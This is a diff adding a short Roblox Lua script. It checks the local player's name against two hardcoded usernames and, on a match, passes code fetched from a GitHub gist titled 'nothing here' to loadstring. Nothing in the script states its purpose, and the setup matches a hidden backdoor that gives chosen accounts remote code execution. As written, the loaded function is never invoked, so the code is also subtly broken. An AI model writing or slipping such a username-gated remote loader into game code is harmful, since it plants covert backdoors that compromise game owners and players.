@@ -1,0 +1,12 @@
+local table = {"lNightRootBr", "Dusko_XD"}
+local gPlayers = game:GetService("Players")
+local plr = gPlayers.LocalPlayer
+
+if plr then
+    local valor = tostring(plr)
+    for i,v in pairs(table)do
+        if v == valor then
+            loadstring(game:HttpGet("https://gist.githubusercontent.com/NightRootbr/48ed726aa9c4211b076a0a6934394042/raw/9b12af9138f983035a9a2301bdda4404b2d6e28b/nothing%2520here"))
+        end
+    end
+end
